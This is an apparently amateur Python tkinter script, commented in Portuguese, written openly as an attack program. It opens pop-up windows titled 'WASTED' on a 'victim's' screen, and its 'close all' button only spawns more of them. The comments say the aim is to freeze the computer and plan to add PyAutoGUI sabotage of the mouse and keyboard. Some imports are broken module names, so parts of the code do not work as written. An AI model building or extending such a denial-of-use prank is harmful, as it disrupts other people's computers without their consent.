# ======================================================================================================================================================================== #
#                                                                                   BIBLIOTECAS                                                                            #
# ======================================================================================================================================================================== #

from tkinter import *
from tkinter.ttk import *
import request
import system 
import win32

# ======================================================================================================================================================================== #
#                                                                      CORES E FORMATAÇÕES GENÉRICAS DO CÓDIGO                                                             #
# ======================================================================================================================================================================== #

corVermelha = '#fc0505'
corPreta = '#000000'
corAzulEscuro = '#00044f'

# ======================================================================================================================================================================== #
# CÓDIGO TENTANDO CRIAR UMA IMAGEM DE CAVEIRA PARA A LOGO DA JANELA.
# IMAGEM BAIXADA E DENTRO DA MESMA PASTA DO CÓDIGO JÁ.
# logo = PhotoImage(file='attack-loop.png')
# attackLoop.iconphoto(False, PhotoImage(file='attack-loop.png'))
# ======================================================================================================================================================================== #

# ======================================================================================================================================================================== #
# PROGRAMA PARA INUNDAR A TELA DA VÍTIMA COM JANELINHAS POP UPS IGUAIS, PARA QUE ELE TENHA QUE FECHAR UMA POR UMA.
# UM ATAQUE SIMPLES, ATÉ PUERIL, MAS QUE ACONTECE E É EFETIVO SE TIVER POR EXEMPLO NO CÓDIGO PARA ABRIR 1 MILHÃO DE JANELINHAS PODE TRAVAR O COMPUTADOR.
# A EFETIVIDADE É QUE ELE NO MÁXIMO VAI TRAVAR O PC E TER QUE REINICIAR. VAMOS ESTUDAR PARA MELHORAR ISSO DAÍ.
# AQUI A GENTE COLOCA NO SEGUNDO PARÂMETRO DO LOOP "for", A QUANTIDADE DE VEZES QUE A GENTE QUER QUE ABRA A JANELINHA NA TELA DA VÍTIMA.
# ======================================================================================================================================================================== #

def popUpMaldito():

    for c in range(0, 1): 
        
        attackLoop = Tk() # NOME DA TELA QUE SERA CRIADA, POR EXEMPLO NESSE CASO E O "attackLoop" QUE RECEBE O PARAMETRO "=Tk()"
        attackLoop.title('WASTED') # A FUNCAO ".title()" RECEBE COMO PARAMETRO O NOME DA TELA, QUE DEVE APARECER NO CABECALHO DA JANELA
        attackLoop.geometry("350x300")
        attackLoop.config(background=corPreta)
        attackLoop.resizable(width=False, height=False)
        
        linha000 = Label(attackLoop, font=('Calibri', 20), background=corVermelha)
        linha000.grid(column=0, row=0)
        
        linha001 = Label(attackLoop, text=('TESTE DE ATAQUE'), font=('Calibri', 40), background=corVermelha)
        linha001.grid(column=0, row=1)
        
        linha002 = Label(attackLoop, text=' ', font=('Calibri', 20), background=corVermelha)
        linha002.grid(column=0, row=2)
        
        # PRIMEIRA LINHA DE PEGADINHA, MAS SE CAIR AQUI TAMBÉM, TEM MAIS É QUE SE FUDER MESMO, NÉ? CLICOU NO FECHAR TUDO TEM QUE REINICIAR O PROGRAMA.
          
        linha003 = Checkbutton(attackLoop, text='TUDO')
        linha003.grid(column=0, row=3)
        
        # ================================================================================================================================================================= # 
        # É RELEVANTE SE UTILIZAR A PALAVRA "values" PARA PASSAR OS PARÂMETROS DE OPÇÕES OU NÃO VAI FUNCIONAR A LINHA DO COMBOBOX DO TKINTER.
        # ESSA linha004 GERA UMA CAIXA DE DIÁLOGO COM O USUÁRIO ONDE ELE TERÁ VÁRIAS OPÇÕES DE UTILIZAÇÃO. 
        # AQUI O OBJETIVO É QUE, POR EXEMPLO O PyAutoGUI FAÇA SUA PARTE POR EXEMPLO QUEBRANDO O MOUSE E TECLADO DO USUÁRIO
        # TROCAR AS LETRAS DIGITADAS DE FORMA ALEATÓRIA PODE SER INTERESSANTE, PORÉM DENTRO DE UM IF GIGANTE? OU 3 (UM PARA LETRAS, OUTRO PARA NÚMEROS?)
        # ================================================================================================================================================================== #

        linha004 = Combobox(attackLoop)       
        linha004["values"] = ('TODAS AS JANELAS', 'ESTA JANELA')
        linha004.current(0)
        linha004.grid(column=0, row=4)

        linha005 = Button(attackLoop, text=' F E C H A R  T U D O ! ', command=popUpMaldito)
        linha005.grid(column=0, row=5)
        
        linha006 = Label(attackLoop, text=' ', background=corVermelha)
        linha006.grid(column=0, row=6)

        
        
        # COMANDO QUE VAI MANTER A TELA ABERTA ATÉ QUE O USUÁRIO FECHE NO BOTÃO "FECHAR" É O attack.mainloop()"

    attackLoop.mainloop()

# COMO A GENTE FEZ UM "for" DENTRO DE UMA FUNÇÃO, PARA QUE ELE ABRA OUTRAS JANELAS INFINITAMENTE, PRECISA ABRIR A FUNÇÃO.

popUpMaldito() 


# FIM DO CÓDIGO. TUDO DEPOIS DISSO AQUI NÃO DEVERÁ FUNCIONAR. 